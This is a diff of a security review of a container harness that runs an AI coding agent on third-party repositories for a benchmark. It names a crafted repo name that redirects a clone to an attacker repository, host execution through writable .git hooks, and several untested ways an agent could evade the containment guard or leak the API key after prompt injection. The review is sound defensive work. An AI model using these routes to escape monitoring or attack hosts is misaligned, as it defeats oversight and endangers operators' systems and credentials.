-failure condition). And the real fix remains the R3 egress allowlist: restricting the container to
-`api.anthropic.com` is what makes this git-local control load-bearing rather than aspirational.
-
----
-
-#### 5. `slug_for()` is now safe, but `fork` still builds the clone URL unvalidated
+#### `--reset` writes to the clone even when the manifest gate is the thing protecting the path
 
 **Severity:** Low
-**Location:** `scripts/crb-materialize.py:82-88` (the fix), `scripts/crb-materialize.py:206` (the
-half that was not fixed)
-**Boundary:** B1
-**Move:** #2 (implicit sanitization assumption)
-**Confidence:** Medium — the gap is unambiguous; exploitability needs a hostile or corrupted
-vendored dataset, and GitHub would have to serve the normalized path.
-**Legibility-target:** for-author
+**Location:** `scripts/crb-materialize.py:463-496`
+**Boundary:** B5
+**Move:** #2, #5
+**Confidence:** High (read-static)
 
-**Evidence:** the fix, which is correct —
+Asked directly: is anything in the new `--reset` surface reachable with an attacker-influenced
+slug? I traced it and the answer is **no, but the protection is indirect**. `dst = DST_ROOT / slug`
+does not constrain `slug` (`Path("/a") / "/etc"` is `/etc`), and `run-host.sh` takes instance names
+straight from `"$@"`. What saves it is that `reset_clone()` is only called after:
 
-```python
-    slug = f"{parts[1]}-{parts[3]}".replace(".", "_")
-    if not re.fullmatch(r"[A-Za-z0-9_-]+", slug):
-        raise ValueError(f"unsafe slug {slug!r} derived from fork repo name {repo_name!r}")
-    return slug
+```
+            rec = manifest.get(slug) or {}
+            head, base = rec.get("head"), rec.get("base")
+            if not head or (resetting and not base):
 ```
 
-`[A-Za-z0-9_-]+` with `re.fullmatch` blocks `/`, `.` (so `..` cannot form), and any leading `/`, which
-closes exactly the `Path(DST_ROOT) / "/abs"` and `rmtree` scenario pass-1 described. It sits at the
-single derivation point (`load_prs` line 101) that every `DST_ROOT`-bound path in `materialize()`
-flows through. That half is closed.
+and every manifest key was produced by `slug_for()`, which enforces
+`re.fullmatch(r"[A-Za-z0-9_-]+", slug)`. So an absolute or `..`-bearing slug can reach the
+`(dst/".git").is_dir()` probe but never the destructive branch. The `--reset` addition tightened
+this slightly (it now also requires `base`), which is a genuine improvement.
 
-The other half of the pass-1 recommendation — *"and the same check on `fork` before building
-`remote`"* — was not applied:
-
-```python
-    remote = f"{FORK_ORG}/{fork}"
-```
-
-`slug_for(fork)` validates only the **derived** slug, which uses `parts[1]` and `parts[3]`. Every
-other `__`-separated component of `fork` passes through unexamined into the URL. A `repo_name` of
-`x__ok__y__PR1__../../attacker/repo` yields the perfectly innocuous slug `ok-PR1` while producing
-`https://github.com/code-review-benchmark/x__ok__y__PR1__../../attacker/repo`, which RFC 3986 path
-normalization resolves to `https://github.com/attacker/repo` — redirecting the clone, and therefore
-everything downstream at B2, to a repository of the attacker's choosing.
-
-Two smaller gaps on the same boundary, both operator-facing rather than data-facing: `--verify`
-takes slugs straight from `argv` into `DST_ROOT / slug` with no charset check, and `run-host.sh:70-71`
-accepts positional instance ids into `clone="$CLONES/$id"` / `dest="$OUT/$id"` the same way. Both
-are read-mostly and operator-supplied, so they are hardening notes, not bugs.
-
-**Recommendation:** Apply the same `re.fullmatch(r"[A-Za-z0-9_.-]+", fork)` check in `load_prs`
-before `fork` is stored, and reuse it to validate `args.verify` slugs. Three lines, and B1 stops
-being an argument.
+**Recommendation:** Make the protection direct as well as incidental — apply the same
+`re.fullmatch(r"[A-Za-z0-9_-]+", slug)` check to `--verify`/`--reset` arguments at the top of the
+loop, so the guarantee does not depend on a property of a JSON file on disk that a future
+hand-edit could break.
 
 ---
 
-#### 6. R3's remaining exposure is documented only in the commit message, not where the operator will read it
+### Untested bypass candidates
 
-**Severity:** Medium (process/legibility on a High finding, not a new technical exposure)
-**Location:** `runs/review-arms/crb-pipeline/run-host.sh:169-191`, `docs/working/crb-direction1-setup.md:54-58`
-**Boundary:** B2
-**Move:** #6 (follow the secrets), #1 (trust boundaries)
-**Confidence:** High
-**Legibility-target:** for-author
+Per move #11, these were enumerated against the reset/void guardrail and **not** tested:
 
-**Evidence:** the commit message states the deferral plainly and honestly —
+- **`.git/objects/info/alternates`** pointing at an answer-key object store outside the mount.
+  Objects become readable with no fetch, no `FETCH_HEAD`, and nothing unreachable; a commit on top
+  of `head` then classifies benign. Not tested because it needs a second object store staged inside
+  a container run.
+- **`git worktree add` / `GIT_DIR` redirection** creating a second working tree whose refs live in
+  `.git/worktrees/*`. Whether `rev-list --all` and `for-each-ref refs/heads` in `reset_clone()` see
+  per-worktree refs depends on git version and `extensions.worktreeConfig`; not tested.
+- **The three-step defeat named in `fetch_traces()`'s docstring** (remove `FETCH_HEAD` + `reflog
+  expire --expire=now --all` + `gc --prune=now`). Asserted in the docstring, and partially pinned by
+  `test/crb-containment-reset.bats:186`, but I did not execute the full defeat to confirm it leaves
+  the guard silent.
+- **Shallow-clone grafting** — `.git/shallow` manipulation so a fetched commit is treated as a
+  boundary rather than an unreachable object. Not tested.
+- **Timing/TOCTOU on the post-run reset** — a background process left running inside the container
+  is killed by `docker run --rm`, but a process the agent started on a *host-visible* path via the
+  mount is not reachable from here; I did not look for one.
 
-```
-  R3 partially addressed: transcripts/stderr gitignored, harvest no longer
-     follows symlinks. The container still runs with a live key and open
-     egress — a scoped key behind an egress allowlist is a host-side decision
-     and is left to the author.
-```
-
-— and that is an accurate description of what shipped: `-e ANTHROPIC_API_KEY`,
-`--dangerously-skip-permissions`, no `--network` flag, and a read-write `/repo` mount are all
-byte-identical to `529ecd2`. No overclaim anywhere in the code or docs. That is the right call for
-this project's threat model and I would not have wanted it fixed blindly.
-
-What is missing is that the deferral does not appear in either artifact an operator actually reads
-before spending money. `run-host.sh`'s header block (`:34-45`) documents the CLAUDE.md-loads-as-
-instructions property but not the conclusion that follows from it; `crb-direction1-setup.md:54-58`
-still says only `ANTHROPIC_API_KEY=sk-ant-... bash runs/review-arms/crb-pipeline/run-host.sh` with
-no note about which key to use. Meanwhile the same doc gained a "Three guards run per cell" section
-that reads as a security posture improvement. Commit messages are not read at run time; the net
-effect on a reader six weeks from now is that the harness looks *more* contained than it is.
-
-Assessing the partial fix's security value honestly: it is small but real and correctly targeted.
-Gitignoring transcripts means that if injection does occur and the agent echoes the key, the key
-does not land in permanent, unrewritable git history — it converts an unfixable outcome into a
-rotatable one. That is the highest-leverage thing that could be done *without* the host-side
-change, and it was the right thing to pick. `cp --no-dereference` is worth less (see Finding 1).
-Neither reduces the probability of exfiltration at all.
-
-**Recommendation:** One paragraph in `run-host.sh`'s header and one line in the setup doc's step 2:
-"Use a dedicated low-limit key for this arm, not your primary — the container runs untrusted repo
-content with `--dangerously-skip-permissions` and unrestricted egress. See security-review.md R3."
-That costs nothing and makes the deferral survive the commit message. Then keep the actual fix
-(scoped key + `--network` allowlist) on the list — it is still the single highest-value change
-available, and it closes Finding 4's containment gap in the same move.
+Because these are untested, the reset/void guardrail does not appear in Endorsement Claims below.
 
 ---
 
-#### 7. `.gitignore` patterns are correct, but the containment they provide is narrower than it looks
+## Endorsement Claims
 
-**Severity:** Low
-**Location:** `.gitignore:43-49`
-**Boundary:** B3'
-**Move:** #7 (serialization boundary — what leaves, and to where)
-**Confidence:** High
-**Legibility-target:** for-author
+- **Claim:** `--reset`'s destructive branch cannot be reached with a slug that is not a
+  `[A-Za-z0-9_-]+` manifest key.
+  **Location:** `scripts/crb-materialize.py:463-496`, `73-88`
+  **Evidence:** read-static
+  **Verified:** Read the `--verify`/`--reset` branch end to end; `reset_clone()` is called only
+  after `manifest.get(slug)` yields both `head` and `base`, and every manifest key is produced by
+  `slug_for()`, which raises on anything outside `[A-Za-z0-9_-]+`.
+  **Not verified:** The contents of the on-disk `runs/review-arms/crb/instances.json` — a
+  hand-edited or externally-generated manifest key bypasses `slug_for()` entirely, and I did not
+  read the checked-in file's keys.
+  **route: code-fact-check**
 
-**Evidence:**
+- **Claim:** The harvest loop's `cp --no-dereference` plus `git status`'s refusal to descend into
+  symlinked directories together prevent a symlink planted in the clone from copying host file
+  *contents* into the tracked artifacts dir.
+  **Location:** `runs/review-arms/crb-pipeline/run-host.sh:324-344`
+  **Evidence:** read-static
+  **Verified:** Read the loop; a symlinked directory appears in porcelain output as one entry for
+  the link itself, so `x/settings.json` never enters the loop, and a symlinked *file* is copied as
+  a link by `--no-dereference`.
+  **Not verified:** I did not execute a symlink case against `git status --untracked-files=all`;
+  and I did not check what a downstream consumer of `$dest/artifacts/` does with an absolute
+  dangling symlink it finds there.
+  **route: code-fact-check**
 
-```
-runs/**/transcript.jsonl
-runs/**/stderr.log
-```
+- **Claim:** A post-run containment void actually removes the cell from the judged set rather than
+  only annotating it.
+  **Location:** `runs/review-arms/crb-pipeline/run-host.sh:359-372`, `scripts/crb-pipeline-to-benchmark.py:241-242`
+  **Evidence:** read-static
+  **Verified:** Grepped and read the injector's `if (cell / "CONTAINMENT_FAILED").exists()` branch,
+  which skips the cell; the runner both writes that marker and rewrites `result.json` with
+  `is_error=True`, so `crb-cell-status.py` also refuses it.
+  **Not verified:** Whether `review.md`, `transcript.jsonl`, and `artifacts/` from a voided cell
+  are excluded everywhere they are read — they are left in place on disk and I traced only the
+  injector.
 
-Verified these match what `run-host.sh:192` actually writes (`> "$dest/transcript.jsonl"
-2> "$dest/stderr.log"`, `dest="$OUT/$id"` under `runs/review-arms/crb-pipeline/`):
+- **Claim:** `write_run_meta`'s move into an EXIT trap makes provenance survive the SWEEP_BUDGET
+  halt, which exits 2 from inside the loop.
+  **Location:** `runs/review-arms/crb-pipeline/run-host.sh:159-220`, `404`
+  **Evidence:** read-static
+  **Verified:** Read the trap installation, the `META_WRITTEN` idempotence guard, and the
+  `exit 2` inside the loop body; the trap replaces the earlier payload-only trap and runs both jobs.
+  **Not verified:** Behaviour under `set -e` when `write_run_meta`'s heredoc python fails — the
+  `|| true` covers the python call but I did not exercise the trap firing during an active
+  `errexit` unwind.
 
-```
-$ git check-ignore -v runs/review-arms/crb-pipeline/x/transcript.jsonl runs/review-arms/crb-pipeline/x/stderr.log
-.gitignore:48:runs/**/transcript.jsonl	runs/review-arms/crb-pipeline/x/transcript.jsonl
-.gitignore:49:runs/**/stderr.log	runs/review-arms/crb-pipeline/x/stderr.log
-```
-
-A4 is genuinely closed for new runs. The honesty is good too — the inline comment states outright
-that the 16 already-tracked `e7-fable-3x` transcripts stay tracked and that this "prevents new ones,
-it does not rewrite history," so there is no false claim to correct. Three residual notes rather
-than defects:
-
-1. **The remaining tracked channels still carry foreign-repo text.** `result.json` embeds the full
-   `result` string and `review.md` is that string verbatim; both quote code from the reviewed repo.
-   `artifacts/**` copies `.md`/`.json` files out of the clone's working tree. In practice these are
-   agent *output* (the clone starts clean, so only agent-created files appear), which is a far
-   smaller surface than a transcript — but "transcripts are ignored" is not the same as "no foreign
-   content is committed," and the setup doc's new wording is closer to the latter.
-2. **`runs/**/stderr.log` is broader than the finding required.** It now shadows ~9 already-tracked
-   `stderr.log` files under `runs/review-arms/crb/cubic-cli/` and will silently exclude every
-   future arm's stderr from provenance, not just this one's. Tracked files are unaffected, so
-   nothing breaks today; it is a scope creep worth knowing about.
-3. **Finding 1's `cp` can write outside `$dest/artifacts` entirely**, i.e. to a path no
-   `runs/**` rule covers. The gitignore rules do not bound that.
-
-**Recommendation:** Scope the two new patterns to `runs/review-arms/crb-pipeline/**/` if the intent
-was this arm only, and add one sentence to `crb-direction1-setup.md:83-90` noting that
-`result.json`/`review.md`/`artifacts/` remain tracked and still quote reviewed-repo content.
-
----
-
-#### 8. The sweep-budget gate fails closed, but silently under-counts on a malformed cell
-
-**Severity:** Informational
-**Location:** `runs/review-arms/crb-pipeline/run-host.sh:254-267`
-**Boundary:** Internal — no boundary. Justified: no untrusted data crosses here; `$OUT` is
-host-local and the heredoc is quoted so nothing is interpolated. Included because it is a
-spend-limiting control and Move #8 applies to it directly.
-**Move:** #8 (what if there are a million of these), #3 (check the error path)
-**Confidence:** High
-**Legibility-target:** for-author
-
-**Evidence:**
-
-```python
-        try:
-            total += json.load(open(rp)).get("total_cost_usd") or 0
-        except Exception:
-            pass
-```
-
-The gate's structure is right: `<<'EOF'` is quoted so `$OUT`/`$SWEEP_BUDGET` reach Python only as
-`argv`; a non-numeric `SWEEP_BUDGET` raises in `float()`, exits non-zero, and is treated as
-*exceeded* — fail-closed, which is the correct default for a money control. The residual is the
-bare `except: pass`: a truncated or non-JSON `result.json` contributes `0` to the running total, so
-a sweep where several cells wrote garbage will under-report spend and keep going. The worst case is
-bounded (the API-side `--max-budget-usd` still caps each instance), so this is a note, not a defect.
-
-**Recommendation:** Count the unreadable cells and print them alongside the total, e.g.
-`sweep spend so far: $X / $Y (3 result.json unreadable — real spend is higher)`.
-
----
-
-## What Looks Good
-
-- **`verify_containment()` is the right shape.** Extracting the guard into a callable seam,
-  calling it around every cell, adding the surviving-remote check, and pinning `head` to the
-  manifest rather than the clone's own tip (so a moved `review` ref fails instead of validating
-  itself) is exactly what R2 asked for. The pre-run call fails closed. Finding 4 is about the
-  channels it never claimed to cover plus the advisory post-run call, not about the control's
-  design.
-- **The A5 fix picked the right lever.** `: "${MARTIAN_BASE_URL:=https://api.anthropic.com/v1/}"`
-  means the *actual* A5 scenario — key exported, base URL forgotten, credential silently sent to
-  `api.withmartian.com` — is now impossible. That is the fix; the `case` guard is defence in depth
-  on top of it, and Finding 2 is about the depth layer, not the fix.
-- **No credential ever enters the generated file, `argv`, or a log line.** I checked all three
-  explicitly. `judge.sh` references the key only by variable name; the guard's error messages print
-  `$MARTIAN_BASE_URL`, never `$MARTIAN_API_KEY`; and nothing places it on a command line where `ps`
-  would see it.
-- **The resume predicate now requires success.** `num_turns > 0 and not is_error and subtype ==
-  "success"` closes a real failure mode where an errored or budget-exhausted cell was banked as
-  done and locked out of retry — a control whose previous failure mode was *silently measuring
-  less than you paid for*.
-- **The A15 section-anchoring fix, with a test.** `normalize_section()` plus set membership
-  replaces a substring test where `"consider"` matched `"Considered Overrides"`, and
-  `test/crb-injector-sections.bats` includes a regression case that renames the column and asserts
-  the output is unchanged. That is a latent injection path into the judge's scoring input, closed
-  and pinned rather than closed and hoped about.
-- **The A8/A9 doc corrections are the kind of honesty that is hard to fake.** Amending
-  "2 PRs, 11 vs 13" to a measured "24 of 50, values 1–9" with an explicit
-  `*(Corrected 2026-08-18: … understated the effect ~12×)*` note, and adding caveat 2b describing a
-  bias in the *favourable* direction, both raise the credibility of everything else in that file.
-- **The commit message does not overclaim.** R3 is labelled partial, the specific residual is
-  named, and the confidence tags distinguish "verified by execution" from "guard proven
-  non-vacuous, but the escape it prevents was never observed." That is the correct calibration.
+The reset/void guardrail itself (`reset_clone`, `fetch_traces`, `classify_strays`) is deliberately
+**absent** from this section: it has five untested bypass candidates listed above.
 
 ---
 
@@ -552,46 +431,45 @@ bounded (the API-side `--max-budget-usd` still caps each instance), so this is a
 
 | # | Finding | Severity | Boundary | Location | Confidence |
 |---|---------|----------|----------|----------|------------|
-| 1 | Harvest `tr\|cut` rewrite → host path escape out of `$dest/artifacts` (**new, regression**) | High | B3' | `runs/review-arms/crb-pipeline/run-host.sh:222-231` | High / Medium |
-| 2 | `judge.sh` endpoint guard is an unanchored substring glob; override message contradicts itself | Medium | B5' | `scripts/crb-pipeline-to-benchmark.py:463-468` | High |
-| 3 | `judge.sh` built by raw f-string interpolation; `--judge` reaches a command substitution | Medium | B7 | `scripts/crb-pipeline-to-benchmark.py:448-481` | High / Low reach |
-| 4 | Post-run containment check is advisory only; `git fetch <url>` leaves no ref to catch | Medium | B6' | `runs/review-arms/crb-pipeline/run-host.sh:236-237` | High / Medium |
-| 5 | `fork` still unvalidated into the clone URL (A6 half-fixed) | Low | B1 | `scripts/crb-materialize.py:206` | Medium |
-| 6 | R3's residual exposure documented only in the commit message | Medium | B2 | `runs/review-arms/crb-pipeline/run-host.sh:169-191` | High |
-| 7 | `.gitignore` correct but narrower containment than the docs imply | Low | B3' | `.gitignore:43-49` | High |
-| 8 | Sweep-budget gate silently under-counts unreadable cells | Informational | Internal | `runs/review-arms/crb-pipeline/run-host.sh:254-267` | High |
+| 1 | Host RCE from container-writable `.git/hooks` + `.git/config` (hooks, `core.fsmonitor`, `core.hooksPath`, smudge filters) | Critical | B1, B2 | `crb-materialize.py:348-361`, `run-host.sh:344` | High (executed) |
+| 2 | `core.worktree` redirects `git clean -qfdx` at arbitrary host paths | Critical | B1, B2 | `crb-materialize.py:357` | High (executed) |
+| 3 | Nested clone of the answer key survives `clean -qfdx` and is invisible to all checks | High | B3 | `crb-materialize.py:200-286, 357` | High (executed) |
+| 4 | Reset/void split detects only in-place git fetch; non-git retrieval classifies benign | High | B3 | `crb-materialize.py:267-286, 315-343` | High |
+| 5 | Amend/squash/rebase by the agent voids a clean cell, polluting `voided_cells` | Medium | B3 | `crb-materialize.py:339-343` | Medium |
+| 6 | Pre-run gate changed from read-only `--verify` to repairing `--reset` | Medium | B3 | `run-host.sh:262-264` | Medium |
+| 7 | `--reset` path safety depends indirectly on manifest key hygiene | Low | B5 | `crb-materialize.py:463-496` | High |
 
 ---
 
 ## Overall Assessment
 
-This is a good fix pass that got one thing backwards. Five of the six prior findings moved in the
-right direction — R2's containment guard is now a real, callable, pre/post control; A5's actual
-failure scenario is impossible; A6's path escape is closed at the point that mattered; A4's
-transcripts will not enter history; and R3's deferral is described accurately rather than papered
-over. The commit message's calibration is notably honest, and the doc corrections (A8/A9, including
-a self-flagged 12× understatement and a caveat that cuts *against* the arm) are the strongest
-signal in the whole diff that the numbers this harness produces can be trusted.
+The containment work in this diff is good at what it set out to do — the reset/void split is
+carefully reasoned, honestly documented about its own limits, and unusually well pinned by
+`test/crb-containment-reset.bats` (including a non-vacuity test for `scrub_object_store`, which is
+the kind of thing most suites never get). Findings 4, 5 and 6 are refinements to that work, and the
+most useful of them is 4: the guard should stop being read, by its own artifacts, as evidence that
+containment held, because it detects exactly one retrieval route out of at least five.
 
-The exception is Finding 1, and it deserves to be the headline: the hunk that was supposed to close
-A7 (symlink dereference) replaced a mis-parse with a worse one. `tr '\0' '\n'` discards the entire
-point of the `-z` flag added two characters earlier, and `cut -c4-` then chops three characters off
-any path fragment that arrives without a status prefix — which is every newline-split filename and
-every rename's original path. The result is a host-side read *and* write primitive that escapes
-`$dest/artifacts` under an attacker-chosen relative path, reachable by any agent that can create a
-file with a newline in its name. That is a strictly larger hole than the one A7 described, so A7
-should be recorded as **regressed**, not closed. It is fixable in place — a NUL-delimited `read -d ''`
-loop plus a `case $f in /*|*..*) continue;;` rejection, roughly five lines.
+Findings 1–3 are a different matter and they are not really about the diff's logic — they are about
+the *shape* the diff now leans on harder. `--verify` was read-only; `--reset` runs `checkout
+--force`, `reset --hard`, `clean -qfdx`, `gc` and `symbolic-ref -d` on the host against a `.git`
+directory that a `--dangerously-skip-permissions` agent had unrestricted write access to, and I
+demonstrated five distinct host-side execution or destruction paths out of that arrangement. This
+is an architectural problem, not an in-place fix: the container needs the worktree, it does not need
+`.git`, and separating the two closes B2 entirely. The `-c`-override mitigation is worth applying
+today as a stopgap, but it is a denylist against a config surface that grows with each git release.
 
-Ranked: **(1)** fix the harvest parse before any live sweep, since an injected agent is exactly the
-threat model the rest of this commit is built around; **(2)** anchor the `judge.sh` endpoint glob
-and `shlex.quote()` the interpolations, ten minutes of work on brand-new surface; **(3)** make the
-post-run containment verdict durable so a contaminated cell cannot silently reach
-`benchmark_data.json`; **(4)** put R3's deferral in the script header where an operator will see it.
-The scoped key plus egress allowlist remains the single highest-value change available and is
-correctly parked with the author — it would close Findings 4 and 6 as a side effect.
+The single most important thing to address: **do not run the sweep until the container stops having
+write access to `.git`, or until every host-side git invocation against these clones is hardened.**
+Fifty third-party repositories is fifty chances, and the host shell holds a live
+`ANTHROPIC_API_KEY`.
+
+No categorical all-clear is claimed: findings are limited to the code paths read and the five
+reproductions executed; endorsement claims are pending execution verification where marked.
+
+---
 
 ## Goal-Alignment Note
-- Answered: yes — per-finding verdicts on all six prior items plus a fresh pass on the new surface, saved to `docs/reviews/security-review.md` with `Commit: ed68ced`
-- Out of scope: pass-1 Findings 2/6/8/9 (npm volume, judge-prompt injection, temp-dir leak) are unchanged by this commit and were not re-litigated; docs-only siblings `ae3362b`/`92749ff` and the rewritten fact-check reports were read for context but not reviewed; no git-mutating verification was performed — the Finding 1 traversal was confirmed against a synthesised `git status -z` byte stream, and the Finding 2/3 shell behaviours in a throwaway shell, per the session safety constraint
-- Escalate: (a) **Finding 1 blocks the first live sweep** — the fix commit's A7/A16 hunk introduced a host-side arbitrary-write path that is strictly worse than the symlink issue it replaced, so the rubric's A7 row should be reopened as *regressed* rather than marked resolved; (b) the rubric at `docs/reviews/code-review-rubric-2026-08-18-feat-crb-direction1-harness.md` still shows R1/R2/R3 as 🔴 Unresolved — `ed68ced` did not update it, so the review-fix loop's status ledger is stale and needs a reconciliation pass independent of this review.
+- **Answered:** yes — all four questions answered, with three of them backed by executed reproductions.
+- **Out of scope:** R3 (container egress / API-key blast radius) was treated as known and excluded from verdicts per the brief, though findings 1–3 raise its urgency and finding 4 depends on it as the real control. `docs/human-author/LLM Code Review.md` and `docs/working/crb-direction1-setup.md` (doc-only changes) were read for context but not reviewed for security. `crb-cell-status.py` and the attrition work carry no trust-boundary crossing beyond B6 and produced no findings.
+- **Escalate:** (a) Findings 1 and 2 are gating on the sweep and need a host/architecture decision, not an in-file fix — they belong in the same bucket as R3, and arguably outrank it, since they need no attacker-controlled network to land. (b) Finding 4's recommendation is a change to what `run-meta.json` and the leaderboard *claim*, which touches the same provenance surface this diff just reworked — worth folding into the iteration-3 pass rather than filing separately.
